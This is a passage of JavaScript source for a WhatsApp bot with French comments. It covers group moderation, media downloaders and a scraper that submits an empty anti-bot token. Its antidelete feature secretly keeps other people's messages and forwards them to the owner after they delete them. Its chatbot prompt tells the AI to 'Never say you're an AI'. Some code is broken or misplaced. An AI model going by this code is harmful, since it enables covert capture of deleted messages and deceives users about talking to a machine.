      } catch(e) { console.error('[AD REVOKE upsert]', e); }
    }
  });
}

// ── Fonction centrale de traitement ──
async function processRevoke(sanitized, ownerJid, socket, msgId, chatId, participant) {

  const cfg = await loadUserConfigFromMongo(sanitized) || {};
  if (!cfg.antidelete || cfg.antidelete === 'off') return;

  const mode      = cfg.antidelete;
  const isGroup   = (chatId || '').endsWith('@g.us');
  const isPrivate = (chatId || '').endsWith('@s.whatsapp.net');

  if (mode === 'g' && !isGroup)   return;
  if (mode === 'p' && !isPrivate) return;

  const deletedMsg = getStoredMessage(sanitized, msgId);
  if (!deletedMsg) {
    console.warn(`[ANTIDELETE][${sanitized}] ${msgId} absent du store`);
    return;
  }

  const senderNum    = (participant || chatId || '').split('@')[0];
  const deletionTime = getHaitiTimestamp();
  const context      = isGroup
    ? `👥 *ɢʀᴏᴜᴘᴇ :* ${chatId}\n`
    : `💬 *ᴘʀɪᴠᴇ́ :* +${senderNum}\n`;

  // ── Notification ──
  await socket.sendMessage(ownerJid, {
    text: 
          `╭┄┄「 ⊹ ࣪ ˖ *𝐀𝐍𝐓𝐈𝐃𝐄𝐋𝐄𝐓𝐄* ⊹ ࣪ ˖ 」\n` +
          `│. ˚˖𓍢ִ໋👤 *ᴀᴜᴛᴇᴜʀ :* @${senderNum}\n` +
          `│. ˚˖𓍢ִ໋${context}` +
          `│. ˚˖𓍢ִ໋⏰ *ʜᴇᴜʀᴇ  :* ${deletionTime}\n` +
          `╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,
    mentions: [participant || chatId]
  });

  // ── Contenu ──
  const m = deletedMsg.message;
  if (!m) return;

  const internalTypes = [
    'protocolMessage', 'reactionMessage', 'pollUpdateMessage',
    'senderKeyDistributionMessage', 'messageContextInfo'
  ];

  const contentType = Object.keys(m).find(t => !internalTypes.includes(t));
  if (!contentType) return;

  // ── Texte ──
  if (contentType === 'conversation' || contentType === 'extendedTextMessage') {
    const text = m.conversation || m.extendedTextMessage?.text || '';
    if (text) {
      await socket.sendMessage(ownerJid, {
        text: `💬 *Contenu supprimé :*\n\n${text}`
      });
    }

  // ── Médias → forward direct ──
  } else if ([
    'imageMessage', 'videoMessage', 'audioMessage',
    'documentMessage', 'stickerMessage', 'gifMessage', 'ptvMessage'
  ].includes(contentType)) {
    try {
      await socket.sendMessage(ownerJid, {
        forward: deletedMsg,
        force: true
      });
    } catch(fwdErr) {
      console.error('[ANTIDELETE] forward échoué:', fwdErr.message);
      await socket.sendMessage(ownerJid, {
        text: `📎 *Média supprimé* _(${contentType.replace('Message', '')})_\n_Impossible de retransférer_`
      });
    }

  } else {
    console.log(`[ANTIDELETE][${sanitized}] type ignoré: ${contentType}`);
  }

  getSessionStore(sanitized).delete(msgId);
}
function generateTS() { return Math.floor(Date.now() / 1000); }
function generateTT(ts) { return CryptoJS.MD5(String(ts) + 'X-Fc-Pp-Ty-eZ').toString(); }

async function reelsvideo(url) {
  const ts = generateTS();
  const tt = generateTT(ts);

  const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'hx-request': 'true',
    'hx-current-url': 'https://reelsvideo.io/',
    'hx-target': 'target',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://reelsvideo.io',
    'Referer': 'https://reelsvideo.io/'
  };

  const body = new URLSearchParams();
  body.append('id', url);
  body.append('locale', 'en');
  body.append('cf-turnstile-response', '');
  body.append('tt', tt);
  body.append('ts', ts);

  // NOTE: utiliser l'endpoint générique ; certains sites exigent l'URL exacte.
  const res = await axios.post('https://reelsvideo.io/reel/', body, { headers });

  const $ = cheerio.load(res.data);

  const username = $('.bg-white span.text-400-16-18').first().text().trim() || null;
  const thumb = $('div[data-bg]').first().attr('data-bg') || null;

  const videos = [];
  $('a.type_videos').each((i, el) => {
    const href = $(el).attr('href');
    if (href) videos.push(href);
  });

  const images = [];
  $('a.type_images').each((i, el) => {
    const href = $(el).attr('href');
    if (href) images.push(href);
  });

  const mp3 = [];
  $('a.type_audio').each((i, el) => {
    const href = $(el).attr('href');
    const id = $(el).attr('data-id');
    if (href && id) mp3.push({ id, url: href });
  });

  let type = 'unknown';
  if (videos.length && images.length) type = 'carousel';
  else if (videos.length) type = 'video';
  else if (images.length) type = 'photo';

  return { type, username, thumb, videos, images, mp3 };
}



function handleGroupStatusMention(socket, sessionId) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    try {
      if (!messages || !messages.length) return;
      const m = messages[0];
      if (!m || !m.message || !m.key) return;

      const remote = m.key.remoteJid || '';
      // Vérifier que c'est bien un groupe
      if (!remote.endsWith('@g.us')) return;

      // Charger la config de la session
      const cfg = await loadUserConfigFromMongo(sessionId) || {};
      if (!cfg.antistatusmention) return; // mode désactivé

      // Détecter le type du message
      const keys = Object.keys(m.message);
      const type = keys.length ? keys[0] : 'unknown';

      // Si c'est une mention de statut de groupe
      if (type === 'groupStatusMentionMessage') {
        const groupId = remote;
        const participant = m.key.participant || m.key.from || null;
        const participantNum = participant ? participant.split('@')[0] : 'inconnu';

        // Supprimer le message
        try {
          await socket.sendMessage(groupId, { delete: m.key });
        } catch (e) {
          console.warn('[ANTISTATUS] suppression échouée', e?.message || e);
        }

        // Avertir publiquement l’expéditeur
        try {
          await socket.sendMessage(groupId, {
            text: `⚠️ @${participantNum}, les mentions de statut sont interdites dans ce groupe. Répète et tu seras expulsé.`,
            mentions: participant ? [participant] : []
          });
        } catch (e) {
          console.warn('[ANTISTATUS] avertissement échoué', e?.message || e);
        }

        // Incrémenter le compteur d’infractions en Mongo
        let count = 1;
        try {
          count = await incrStatusInfraction(sessionId, groupId, participant);
        } catch (e) {
          console.error('[ANTISTATUS] erreur incrStatusInfraction', e);
        }

        // Seuil configurable (par défaut 2)
        const THRESHOLD = (cfg.antistatusmention_threshold && Number(cfg.antistatusmention_threshold)) || 2;

        // Si récidive >= seuil => expulsion
        if (count >= THRESHOLD) {
          try { await resetStatusInfraction(sessionId, groupId, participant); } catch(e){}

          let groupMeta = null;
          try {
            groupMeta = await socket.groupMetadata(groupId);
          } catch (e) {
            console.warn('[ANTISTATUS] impossible de récupérer groupMetadata', e?.message || e);
          }

          // Vérifier si participant est admin
          const isParticipantAdmin = groupMeta?.participants?.some(p => p.id === participant && (p.admin === 'admin' || p.admin === 'superadmin'));
          if (isParticipantAdmin) {
            await socket.sendMessage(groupId, {
              text: `⚠️ @${participantNum} a atteint le seuil d'infractions mais est administrateur, impossible de l'expulser.`,
              mentions: [participant]
            });
            return;
          }

          // Vérifier si le bot est admin
          const botJid = socket.user?.id || socket.user?.jid || null;
          const isBotAdmin = groupMeta?.participants?.some(p => p.id === botJid && (p.admin === 'admin' || p.admin === 'superadmin'));
          if (!isBotAdmin) {
            await socket.sendMessage(groupId, {
              text: `⚠️ Le bot n'est pas administrateur, impossible d'expulser @${participantNum}.`,
              mentions: [participant]
            });
            return;
          }

          // Expulser
          try {
            await socket.groupParticipantsUpdate(groupId, [participant], 'remove');
            await socket.sendMessage(groupId, {
              text: `🚫 @${participantNum} a été expulsé pour récidive (mentions de statut).`,
              mentions: [participant]
            });
          } catch (e) {
            console.error('[ANTISTATUS] erreur expulsion', e);
            await socket.sendMessage(groupId, {
              text: `⚠️ Impossible d'expulser @${participantNum}.`,
              mentions: [participant]
            });
          }
        }
      }
    } catch (err) {
      console.error('[ANTISTATUS HANDLER ERROR]', err);
    }
  });
}
// ---------------- command handlers ----------------
function setupCommandHandlers(socket, number) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    // ── STORE tous les messages pour antidelete ──
  for (const m of messages) {
    if (m?.key?.id && m?.message && !m.key.fromMe) {
      storeMessage(number, m);
    }
  }
    
    // 1. Vérifications de base
    if (!msg || !msg.message) return;
    
    const remoteJid = msg.key.remoteJid;
    if (!remoteJid) return;
    
    // 2. Déterminer le type de message pour extraire le body
    const type = getContentType(msg.message);
    
    // Gérer les messages éphémères
    msg.message = (type === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;
    
    // 3. Extraire le texte du message
    const body = (type === 'conversation') ? msg.message.conversation
      : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage?.text
      : (type === 'imageMessage') ? msg.message.imageMessage?.caption
      : (type === 'videoMessage') ? msg.message.videoMessage?.caption
      : (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage?.selectedButtonId
      : (type === 'listResponseMessage') ? msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
      : (type === 'viewOnceMessage') ? (msg.message.viewOnceMessage?.message?.imageMessage?.caption || '') 
      : (type === 'interactiveResponseMessage') ? (() => {
      try {
        // quick_reply carousel → paramsJson contient { id: ".dlapk nom lien" }
        const raw = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
        if (raw) {
          const parsed = JSON.parse(raw);
          if (parsed?.id) return parsed.id;        // ← ".dlapk nom lien"
        }
      } catch(_) {}
      // fallback : body text brut (autres types interactifs)
      return msg.message.interactiveResponseMessage?.body?.text || '';
    })()
  : '';
    
    // Normaliser le body
    const normalizedBody = (typeof body === 'string') ? body.trim() : '';
    
    // --- Chargement de la configuration du bot (persistante) ---
    // Utiliser le numéro passé en paramètre (identifiant de session)
    const sessionId = number || (socket.user?.id?.split(':')[0] + '@s.whatsapp.net') || socket.user?.id;
    const cfg = await loadSessionConfigMerged(sessionId);  // fourni par ton système MongoDB
    console.log('[HANDLER] merged cfg for', sessionId, cfg);
    
    // --- Traitement antilink (déjà existant) ---
    if (remoteJid && remoteJid.endsWith('@g.us')) {
      try {
        const handled = await handleAntiLink(socket, msg, remoteJid, normalizedBody);
        if (handled) return; // message supprimé/traité -> stop further processing
      } catch (e) {
        console.error('ANTILINK HANDLER ERROR', e);
      }
    }

    // --- ANTISTICKER HANDLER ---
    if (remoteJid && remoteJid.endsWith('@g.us') && type === 'stickerMessage') {
      try {
        if (global.antistickerGroups && global.antistickerGroups.has(remoteJid)) {
          const senderJid = msg.key.participant || msg.key.remoteJid;
          const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, remoteJid);
          // Ne pas kicker les admins
          if (!groupAdminsJid.includes(senderJid) && botJid && groupAdminsJid.includes(botJid)) {
            try { await socket.sendMessage(remoteJid, { delete: msg.key }); } catch (_) {}
            await socket.sendMessage(remoteJid, {
              text: `🎴 *ANTISTICKER* — @${senderJid.split('@')[0]} stickers interdits ici!`,
              mentions: [senderJid]
            });
          }
          return;
        }
      } catch (e) { console.error('[ANTISTICKER HANDLER]', e); }
    }
    
    // --- DÉBUT ANTI-TAG (pour les mentions de statut de groupe) ---
    if (msg.message?.groupStatusMentionMessage) {
      try {
        const jid = remoteJid;
        // Ne pas traiter si ce n'est pas un groupe ou si c'est un message du bot
        if (!jid.endsWith('@g.us') || msg.key.fromMe) return;

        const mode = cfg.ANTI_TAG_MODE || 'off';
        if (mode === 'off' || mode === 'false') return;

        // Groupe exempté (personnalisable)
        const exemptGroup = "120363426815283643@g.us"; // Remplace par ton groupe si besoin
        if (jid === exemptGroup) return;

        // Récupérer les métadonnées du groupe pour vérifier les admins
        const groupMetadata = await socket.groupMetadata(jid).catch(() => null);
        if (!groupMetadata) return;

        const participants = groupMetadata.participants;
        const senderJid = msg.key.participant || msg.key.remoteJid;

        // Vérifier si l'expéditeur est admin
        const isSenderAdmin = participants.find(p => p.id === senderJid)?.admin === 'admin' || 
                              participants.find(p => p.id === senderJid)?.admin === 'superadmin';

        // Vérifier si le bot est admin
        const botJid = socket.user?.id?.split(':')[0] + '@s.whatsapp.net' || socket.user?.id;
        const isBotAdmin = participants.find(p => p.id === botJid)?.admin !== null;

        // Si l'utilisateur est admin : simple avertissement, pas de sanction
        if (isSenderAdmin) {
          await socket.sendMessage(jid, {
            text: `╭┄┄「 ⊹ ࣪ ˖𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓⊹ ࣪ ˖ 」\n│ ⊹ ࣪ ˖  ᴀᴅᴍɪɴ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴ ᴅᴇᴛᴇᴄᴛᴇᴅ\n│ ⊹ ࣪ ˖  ᴜsᴇʀ: @${senderJid.split('@')[0]}\n│. ˚˖𓍢ִ໋  ᴀᴅᴍɪɴs ɢᴇᴛ ᴀ ғʀᴇᴇ ᴘᴀss ғᴏʀ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴs\n│. ˚˖𓍢ִ໋  ʙᴜᴛ sᴇʀɪᴏᴜsʟʏ, ᴋᴇᴇᴘ ɪᴛ ᴍɪɴɪᴍᴀʟ! 😒\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*`,
            mentions: [senderJid]
          });
          return;
        }

        // Si le bot n'est pas admin : on prévient mais on ne peut pas supprimer
        if (!isBotAdmin) {
          await socket.sendMessage(jid, {
            text: `╭┄┄「 ⊹ ࣪ ˖𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓⊹ ࣪ ˖ 」\n│. ˚˖𓍢ִ໋  ᴄᴀɴ'ᴛ ᴅᴇʟᴇᴛᴇ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴ! 😤\n│. ˚˖𓍢ִ໋  ᴜsᴇʀ: @${senderJid.split('@')[0]} ᴊᴜsᴛ ᴅʀᴏᴘᴘᴇᴅ ᴀ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴ\n│. ˚˖𓍢ִ໋  ʙᴜᴛ ɪ'ᴍ ɴᴏᴛ ᴀᴅᴍɪɴ ʜᴇʀᴇ! ʜᴏᴡ ᴇᴍʙᴀʀʀᴀssɪɴɢ...\n│. ˚˖𓍢ִ໋  ᴀᴅᴍɪɴs: ᴍᴀᴋᴇ ᴍᴇ ᴀᴅᴍɪɴ sᴏ ɪ ᴄᴀɴ ᴅᴇʟᴇᴛᴇ ᴛʜɪs ɴᴏɴsᴇɴsᴇ!\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*`,
            mentions: [senderJid]
          });
          return;
        }

        // Supprimer le message de mention de statut
        await socket.sendMessage(jid, {
          delete: {
            remoteJid: jid,
            fromMe: false,
            id: msg.key.id,
            participant: senderJid
          }
        });

        // Action selon le mode
        if (mode === 'delete') {
          await socket.sendMessage(jid, {
            text: `╭┄┄「 ⊹ ࣪ ˖𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ ˖ 」\n│ ⊹ ࣪ ˖  sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴ ᴅᴇʟᴇᴛᴇᴅ! 🗑️\n│. ˚˖𓍢ִ໋  ᴜsᴇʀ: @${senderJid.split('@')[0]} ᴛʜᴏᴜɢʜᴛ ᴛʜᴇʏ ᴄᴏᴜʟᴅ sᴘᴀᴍ\n│ ⊹ ࣪ ˖  sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴs ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ ʜᴇʀᴇ!\n│. ˚˖𓍢ִ໋  ɴᴇxᴛ ᴠɪᴏʟᴀᴛɪᴏɴ = ɪᴍᴍᴇᴅɪᴀᴛᴇ ʀᴇᴍᴏᴠᴀʟ! ⚠️\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*`,
            mentions: [senderJid]
          });
        } else if (mode === 'remove') {
          try {
            await socket.groupParticipantsUpdate(jid, [senderJid], 'remove');
            await socket.sendMessage(jid, {
              text: `╭──「 ⊹ ࣪ 𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ ˖ 」\n│. ˚˖𓍢ִ໋  ᴜsᴇʀ ʀᴇᴍᴏᴠᴇᴅ ғᴏʀ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴ! 🚫\n│ ⊹ ࣪ ˖  @${senderJid.split('@')[0]} ɪɢɴᴏʀᴇᴅ ᴛʜᴇ ᴡᴀʀɴɪɴɢs\n│. ˚˖𓍢ִ໋  ɴᴏ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴs ᴀʟʟᴏᴡᴇᴅ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ!\n│. ˚˖𓍢ִ໋  ʟᴇᴀʀɴ ᴛʜᴇ ʀᴜʟᴇs ᴏʀ sᴛᴀʏ ᴏᴜᴛ! 😤\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*`,
              mentions: [senderJid]
            });
          } catch (kickErr) {
            await socket.sendMessage(jid, {
              text: `╭┄┄「 ⊹ ࣪ ˖𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 ⊹ ࣪ ˖ 」\n│ ⊹ ࣪ ˖  Failed to Remove User! 😠\n│. ˚˖𓍢ִ໋  ᴛʀɪᴇᴅ ᴛᴏ ᴋɪᴄᴋ @${senderJid.split('@')[0]} ғᴏʀ sᴛᴀᴛᴜs ᴍᴇɴᴛɪᴏɴ\n│ ⊹ ࣪ ˖  ʙᴜᴛ ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴇɴᴏᴜɢʜ ᴘᴇʀᴍɪssɪᴏɴs!\n│. ˚˖𓍢ִ໋  ᴀᴅᴍɪɴs: ғɪx ᴍʏ ᴘᴇʀᴍɪssɪᴏɴs ᴀɴᴅ ᴘʀᴏᴍᴏᴛᴇ ᴍᴇ ᴏʀ ᴅᴇᴀʟ ᴡɪᴛʜ sᴘᴀᴍᴍᴇʀs ʏᴏᴜʀsᴇʟғ!\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ\n> *ᴍᴀᴅᴇ ɪɴ ʙʏ ʏᴏᴜ ᴛᴇᴄʜx🌙*`,
              mentions: [senderJid]
            });
          }
        }
      } catch (antitagErr) {
        console.error('[ANTITAG ERROR]', antitagErr);
      }
    }
    // --- FIN ANTI-TAG ---

    // Si pas de texte, on ne peut pas traiter de commande
    if (!body || typeof body !== 'string') return;
    
    // 4. Vérifier si c'est une commande
    const prefix = config.PREFIX || '.';
    const isCmd = body && body.startsWith && body.startsWith(prefix);
    if (!isCmd) return; // Si ce n'est pas une commande, on arrête
    
    const command = body.slice(prefix.length).trim().split(' ').shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    
    // 5. Récupérer les informations d'expéditeur
    const from = remoteJid;
    const sender = from;
    const nowsender = msg.key.fromMe 
      ? (socket.user.id.split(':')[0] + '@s.whatsapp.net' || socket.user.id) 
      : (msg.key.participant || remoteJid);
    const senderNumber = (nowsender || '').split('@')[0];
    const botNumber = socket.user.id ? socket.user.id.split(':')[0] : '';
    const isOwner = senderNumber === config.OWNER_NUMBER.replace(/[^0-9]/g, '');
    
    // DEBUG: Afficher les informations pour le débogage
    console.log('DEBUG Command Handler:');
    console.log('- Remote JID:', remoteJid);
    console.log('- Is group?', remoteJid.endsWith('@g.us'));
    console.log('- Command:', command);
    console.log('- Body:', body);
    console.log('- From:', from);
    console.log('- Sender:', nowsender);
    
    // 6. Maintenant, traiter les commandes
    // helper: download quoted media into buffer
    async function downloadQuotedMedia(quoted) {
      if (!quoted) return null;
      const qTypes = ['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage'];
      const qType = qTypes.find(t => quoted[t]);
      if (!qType) return null;
      const messageType = qType.replace(/Message$/i, '').toLowerCase();
      const stream = await downloadContentFromMessage(quoted[qType], messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
      return {
        buffer,
        mime: quoted[qType].mimetype || '',
        caption: quoted[qType].caption || quoted[qType].fileName || '',
        ptt: quoted[qType].ptt || false,
        fileName: quoted[qType].fileName || ''
      };
    }

    if (!command) return;

    try {
      switch (command) {
      // ============================================================
// BRATVIDEO — Sticker animé Brat
// ============================================================
case 'bratvid':
case 'bratvideo': {

  try {

    const axios =
      require("axios");

    const webp =
      require("node-webpmux");

    const crypto =
      require("crypto");

    // ================= REACT =================

    react("🎬");

    // ================= TEXT =================

    const text =
      args.join(" ").trim();

    // ================= CHECK =================

    if (!text) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🎬 BRAT VIDEO 』
│
│ ❌ ENTER SOME TEXT
│
│ 📌 EXAMPLE :
│ .bratvideo YOU WEB BOT
│ .bratvideo OWNER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

> MADE IN BY YOU TECHX OFC`
        },
        { quoted: msg }
      );

    }

    // ================= PROCESS =================

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ⏳ PROCESSING 』
│
│ 🎬 CREATING ANIMATED
│ BRAT STICKER...
│
│ 🚀 PLEASE WAIT
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

    // ================= API =================

    const mediaUrl =
      `https://brat.caliphdev.com/api/brat/animate?text=${encodeURIComponent(text)}`;

    // ================= DOWNLOAD =================

    const response =
      await axios.get(
        mediaUrl,
        {
          responseType:
            "arraybuffer",

          timeout: 30000
        }
      );

    const buffer =
      Buffer.from(
        response.data
      );

    // ================= CHECK =================

    if (
      !buffer ||
      buffer.length < 10
    ) {

      react("❌");

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO CREATE
│ BRAT STICKER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    // ================= EXIF =================

    async function addExif(
      sticker,
      packname,
      author
    ) {

      const img =
        new webp.Image();

      const stickerPackId =
        crypto
          .randomBytes(32)
          .toString("hex");

      const json = {

        "sticker-pack-id":
          stickerPackId,

        "sticker-pack-name":
          packname,

        "sticker-pack-publisher":
          author,

        "emojis":
          ["🎬"]

      };

      const exifAttr =
        Buffer.from([

          0x49, 0x49, 0x2A, 0x00,
          0x08, 0x00, 0x00, 0x00,
          0x01, 0x00, 0x41, 0x57,
          0x07, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x16, 0x00,
          0x00, 0x00

        ]);

      const jsonBuff =
        Buffer.from(
          JSON.stringify(json),
          "utf8"
        );

      const exif =
        Buffer.concat([
          exifAttr,
          jsonBuff
        ]);

      exif.writeUIntLE(
        jsonBuff.length,
        14,
        4
      );

      await img.load(sticker);

      img.exif = exif;

      return await img.save(null);

    }

    // ================= ADD METADATA =================

    let stickerBuffer;

    try {

      stickerBuffer =
        await addExif(
          buffer,
          text,
          "YOU TECHX"
        );

    } catch (e) {

      console.log(
        "EXIF ERROR =>",
        e
      );

      stickerBuffer =
        buffer;

    }

    // ================= SEND =================

    await socket.sendMessage(
      from,
      {

        sticker:
          stickerBuffer,

        contextInfo: {

          newsletterJid:
            "120363426341519710@newsletter",

          newsletterName:
            "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

          externalAdReply: {

            title:
              "ᴅєν уσυ ʙʀᴀᴛ ᴠɪᴅᴇᴏ",

            body:
              "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

            thumbnailUrl:
              "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

            mediaType: 1,

            renderLargerThumbnail: true,

            sourceUrl:
              mediaUrl

          }

        }

      },
      { quoted: msg }
    );

    // ================= SUCCESS =================

    react("✅");

  } catch (e) {

    console.error(
      "BRATVIDEO ERROR =>",
      e?.response?.data || e
    );

    react("❌");

    await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 ❌ ERROR 』
│
│ FAILED TO GENERATE
│ BRAT VIDEO STICKER
│
│ TRY AGAIN LATER
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  }

}
break;


// ========================= CHATBOT STORAGE =========================

const chatbotMemory = {
  messages: new Map(),
  userInfo: new Map()
};

// ========================= CHATBOT FUNCTION =========================

async function getAIResponse(userMessage, userContext = {}) {

  try {

    const fetch =
      require("node-fetch");

    const prompt = `
You're laser md.
Chat naturally like a real human.
Keep replies short.
Use emojis naturally.
Never say you're an AI.

Previous messages:
${(userContext.messages || []).join("\n")}

User message:
${userMessage}
`;

    const res =
      await fetch(
        "https://zellapi.autos/ai/chatbot?text=" +
        encodeURIComponent(prompt)
      );

    const data =
      await res.json();

    if (
      !data ||
      !data.result
    ) return null;

    return String(
      data.result
    ).trim();

  } catch (e) {

    console.log(
      "AI ERROR =>",
      e
    );

    return null;

  }

}

// ========================= CHATBOT SWITCH =========================

case 'chatbot': {

  try {

    if (
      !from.endsWith("@g.us")
    ) {

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🤖 CHATBOT 』
│
│ ❌ GROUP ONLY
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    const sub =
      (
        args[0] || ""
      ).toLowerCase();

    global.chatbotGroups =
      global.chatbotGroups || {};

    if (
      sub === "on"
    ) {

      global.chatbotGroups[from] =
        true;

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🤖 CHATBOT 』
│
│ ✅ CHATBOT ENABLED
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`,

          contextInfo: {

            newsletterJid:
              "120363426341519710@newsletter",

            newsletterName:
              "𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓",

            externalAdReply: {

              title:
                "ᴅєν уσυ cнᴀтвσт",

              body:
                "ᴘᴏᴡᴇʀᴇᴅ ʙʏ уσυ тє¢н",

              thumbnailUrl:
                "https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png",

              mediaType: 1,

              renderLargerThumbnail: true,

              sourceUrl:
                "https://whatsapp.com/channel/120363426341519710"

            }

          }

        },
        { quoted: msg }
      );

    }

    if (
      sub === "off"
    ) {

      delete global.chatbotGroups[from];

      return await socket.sendMessage(
        from,
        {
          text:
`╭┈┈『 🤖 CHATBOT 』
│
│ ❌ CHATBOT DISABLED
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
        },
        { quoted: msg }
      );

    }

    return await socket.sendMessage(
      from,
      {
        text:
`╭┈┈『 🤖 CHATBOT 』
│
│ .chatbot on
│ .chatbot off
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      },
      { quoted: msg }
    );

  } catch (e) {

    console.log(
      "CHATBOT ERROR =>",
      e
    );

    await socket.sendMessage(
      from,
      {
        text:
          "❌ Chatbot error"
      },
      { quoted: msg }
    );

  }

}
break;

case 'ytmp4':
case 'video': {
    try {

        const axios = require('axios');
        const yts = require('yt-search');

        const query = args.join(" ").trim();

        if (!query) {
            return await socket.sendMessage(sender, {
                text: "📌 usage: .ytmp4 <name or url>"
            }, { quoted: msg });
        }

        await socket.sendMessage(sender, {
            react: { text: "🔄", key: msg.key }
        });

        let videoUrl = query;
        let title = "YouTube Video";
        let thumb = null;

        // SEARCH IF NOT URL
        if (!query.startsWith("http")) {
            const search = await yts(query);

            if (!search.videos.length) {
                return socket.sendMessage(sender, {
                    text: "❌ no video found"
                }, { quoted: msg });
            }

            videoUrl = search.videos[0].url;
            title = search.videos[0].title;
            thumb = search.videos[0].thumbnail;
        }

        // SHOW THUMB
        if (thumb) {
            await socket.sendMessage(sender, {
                image: { url: thumb },
                caption: `🎬 ${title}\n⏳ ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ...`
            }, { quoted: msg });
        }

        let videoData = null;

        const apis = [
            `https://eliteprotech-apis.zone.id/ytdown?url=${encodeURIComponent(videoUrl)}&format=mp4`,
            `https://api.yupra.my.id/api/downloader/ytmp4?url=${encodeURIComponent(videoUrl)}`
        ];

        for (const api of apis) {
            try {
                const res = await axios.get(api);

                videoData =
                    res.data?.downloadURL ||
                    res.data?.data?.download_url;

                if (videoData) break;

            } catch {}
        }

        if (!videoData) {
            return socket.sendMessage(sender, {
                text: "❌ download failed"
            }, { quoted: msg });
        }

        // SEND VIDEO
        await socket.sendMessage(sender, {
            video: { url: videoData },
            mimetype: "video/mp4",
            caption: `🎬 ${title}\n✔ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ`
        }, { quoted: msg });

        await socket.sendMessage(sender, {
            react: { text: "✅", key: msg.key }
        });

    } catch (e) {
        console.error("ytmp4 error:", e);

        await socket.sendMessage(sender, {
            text: "❌ error downloading video"
        }, { quoted: msg });
    }
}
break;
      
      // ============================================================
// SONG — Recherche + téléchargement audio YouTube
// ============================================================
case 'play':
case 'song': {

  try {

    if (!text) {

      return reply(
`╭┈┈『 🎵 PLAY COMMAND 』
│
│ ❌ ENTER SONG NAME
│
│ 📌 EXAMPLE :
│ .play Naruto Blue Bird
│ .song Imagine Dragons
│
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ`
      );

    }

    react("🎵");

    const axios = require("axios");

    // ================= SEARCH =================

    const searchUrl =
